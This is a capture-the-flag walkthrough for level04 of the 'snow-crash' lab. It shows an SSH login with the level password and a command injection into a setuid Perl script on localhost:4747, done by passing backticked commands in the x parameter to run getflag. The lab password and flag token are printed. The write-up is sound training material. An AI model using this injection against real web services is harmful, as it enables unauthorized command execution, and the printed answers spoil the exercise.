### TLTR;
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level04
level04@192.168.1.64's password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
***


Login as `level04`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level04
level04@192.168.1.64's password: qi0maab88jeaj46qoumi7maus
```
A Perl script is located in home directory.
```shell
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

The script indicates that it is something running on `localhost:4747`.
Verbose port scan for listening daemons, without sending any data to them.

`nc -zv` allows to check connection to `4747` without sending any data and verbose mode

```shell
level04@SnowCrash:~$ nc -zv localhost 4747
Connection to localhost 4747 port [tcp/*] succeeded!
```
Script expects a value passed in `x` parameter which is passed to `x()` function.
Then, while printing it, backticks are used to evaluate argument by echoing it.

So trying to pass `whoami` command substitution reveals that is evaluated and executed as `flag04`.
```shell
level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
flag04
```
All that remains to be done is to execute `getflag` binary.
```shell
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
